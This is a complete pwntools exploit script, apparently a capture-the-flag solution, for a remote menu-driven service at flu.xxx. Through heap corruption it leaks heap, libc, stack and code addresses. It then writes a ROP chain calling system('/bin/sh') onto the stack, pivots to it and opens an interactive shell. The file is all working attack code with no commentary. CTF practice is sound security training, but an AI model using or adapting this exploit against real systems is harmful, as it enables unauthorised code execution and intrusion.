from pwn import *

###Util
def create(t):
    r.sendline(b'1')
    r.sendline(str(t).encode())
    #r.sendlineafter(b'> ', b'1')
    #r.sendlineafter(b'> ', str(t).encode())

def edit(handle, key, value):
    r.sendline(b'2')
    r.sendline(str(handle).encode())
    r.sendline(str(key).encode())
    r.sendline(str(value).encode())
    #r.sendlineafter(b'> ', b'2')
    #r.sendlineafter(b'> ', str(handle).encode())
    #r.sendlineafter(b'> ', str(key).encode())
    #r.sendlineafter(b'> ', str(value).encode())

def get(handle, key):
    r.sendline(b'3')
    r.sendline(str(handle).encode())
    r.sendline(str(key).encode())
    #r.sendlineafter(b'> ', b'3')
    #r.sendlineafter(b'> ', str(handle).encode())
    #r.sendlineafter(b'> ', str(key).encode())

def show(handle):
    r.sendline(b'4')
    r.sendline(str(handle).encode())
    r.recvuntil(b'Value: ')
    return int(r.recvline()[:-1])
    #r.sendlineafter(b'> ', b'4')
    #r.sendlineafter(b'> ', str(handle).encode())
    #return int(r.recvline().split(b': ')[1][:-1])

###Addr
entrypoint_offset = 0x1bc00
environ_offset = 0x221200
bin_sh_offset = 0x1d8698
system_offset = 0x50d70

###ROPgadget
C_add_rsp_0x228 = 0x1e8f9
L_pop_rdi = 0x2a3e5
L_nop = 0x2a3e6

###Exploit
r = remote('flu.xxx', 10130)

for i in range(3):
    create(1)
edit(1, 1, 1)
for i in range(2):
    create(1)
heap_addr = (show(3) | (show(4) << 32)) - 0x410
print(hex(heap_addr))

edit(0, 0x10000, 0)
edit(0, 0x20000, (heap_addr + 0x2f0) & ((1 << 32) - 1))
edit(0, 0x30000, (heap_addr + 0x2f0) >> 32)
edit(0, 0x40000, 0)
edit(0, 0x50000, 0)
edit(0, 0x60000, 0xffffffff)

edit(3, 0, (heap_addr + 0x480) & ((1 << 32) - 1))
edit(4, 0, (heap_addr + 0x480) >> 32)
get(4, 0)
get(3, 0)

edit(4, 0, 0)
edit(4, 1, (heap_addr + 0x404) & ((1 << 32) - 1))
edit(4, 2, (heap_addr + 0x404) >> 32)
edit(4, 3, 0)
edit(4, 4, 0)
edit(4, 5, 0xffffffff)

get(2, 0)
libc_base = show(2)

edit(4, 1, (heap_addr + 0x408) & ((1 << 32) - 1))
edit(4, 2, (heap_addr + 0x408) >> 32)
get(2, 0)
libc_base |= show(2) << 32
libc_base -= 0x216600
print(hex(libc_base))

edit(4, 1, (libc_base + environ_offset + 0x24) & ((1 << 32) - 1))
edit(4, 2, (libc_base + environ_offset + 0x24) >> 32)
edit(2, 0x10000, 0)
edit(2, 0x20000, 0)

edit(4, 1, (libc_base + environ_offset - 0x34) & ((1 << 32) - 1))
edit(4, 2, (libc_base + environ_offset - 0x34) >> 32)
get(2, 0)
stack_addr = show(2)

edit(4, 1, (libc_base + environ_offset - 0x30) & ((1 << 32) - 1))
edit(4, 2, (libc_base + environ_offset - 0x30) >> 32)
get(2, 0)
stack_addr |= show(2) << 32
print(hex(stack_addr))

edit(4, 1, (stack_addr + 0xdc + 0x48) & ((1 << 32) - 1))
edit(4, 2, (stack_addr + 0xdc + 0x48) >> 32)
edit(2, 0x10000, 0)
edit(2, 0x20000, 0)

edit(4, 1, (stack_addr + 0x84 + 0x48) & ((1 << 32) - 1))
edit(4, 2, (stack_addr + 0x84 + 0x48) >> 32)
get(2, 0)
entrypoint = show(2)

edit(4, 1, (stack_addr + 0x88 + 0x48) & ((1 << 32) - 1))
edit(4, 2, (stack_addr + 0x88 + 0x48) >> 32)
get(2, 7)
entrypoint |= show(2) << 32
code_base = entrypoint - entrypoint_offset
print(hex(code_base))

edit(4, 1, (stack_addr + 0xbc) & ((1 << 32) - 1))
edit(4, 2, (stack_addr + 0xbc) >> 32)
ROPchain = p64(libc_base + L_pop_rdi) + p64(libc_base + bin_sh_offset) + \
           p64(libc_base + L_nop) + \
           p64(libc_base + system_offset)
for i in range(0, len(ROPchain), 4):
    data = u32(ROPchain[i : i + 4])
    edit(2, i + 1, data)

edit(4, 1, (stack_addr - 0x174) & ((1 << 32) - 1))
edit(4, 2, (stack_addr - 0x174) >> 32)
edit(2, code_base >> 32, (code_base + C_add_rsp_0x228) & ((1 << 32) - 1))

r.interactive()
